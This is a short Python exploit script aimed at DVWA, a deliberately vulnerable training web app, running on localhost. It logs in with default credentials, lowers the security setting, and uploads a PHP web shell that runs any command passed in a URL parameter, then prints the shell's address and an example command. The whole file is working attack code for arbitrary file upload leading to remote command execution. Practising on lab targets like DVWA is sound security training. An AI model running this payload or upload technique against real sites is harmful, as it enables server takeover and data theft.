import requests
from bs4 import BeautifulSoup

DVWA_URL = "http://127.0.0.1/dvwa"
USERNAME = "admin"
PASSWORD = "password"

session = requests.Session()

def get_token(url):
    r = session.get(url)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})
    return token["value"] if token else None


# 1️⃣ Login
login_url = f"{DVWA_URL}/login.php"
token = get_token(login_url)

login_data = {
    "username": USERNAME,
    "password": PASSWORD,
    "Login": "Login",
    "user_token": token
}

session.post(login_url, data=login_data)

print("[+] Logged in")

# 2️⃣ Set security level to LOW
session.get(f"{DVWA_URL}/security.php")
sec_token = get_token(f"{DVWA_URL}/security.php")

session.post(
    f"{DVWA_URL}/security.php",
    data={"security": "low", "seclev_submit": "Submit", "user_token": sec_token}
)

print("[+] Security level set to LOW")

# 3️⃣ Upload file
upload_url = f"{DVWA_URL}/vulnerabilities/upload/"
upload_token = get_token(upload_url)

files = {
    "uploaded": ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php")
}

data = {
    "Upload": "Upload",
    "user_token": upload_token
}

r = session.post(upload_url, files=files, data=data)

if "succesfully uploaded" in r.text.lower():
    print("[+] File uploaded successfully")
else:
    print("[-] Upload failed")

# 4️⃣ Shell path
shell_url = f"{DVWA_URL}/hackable/uploads/shell.php"
print("[+] Shell URL:", shell_url)
print("[+] Example: ?cmd=id")
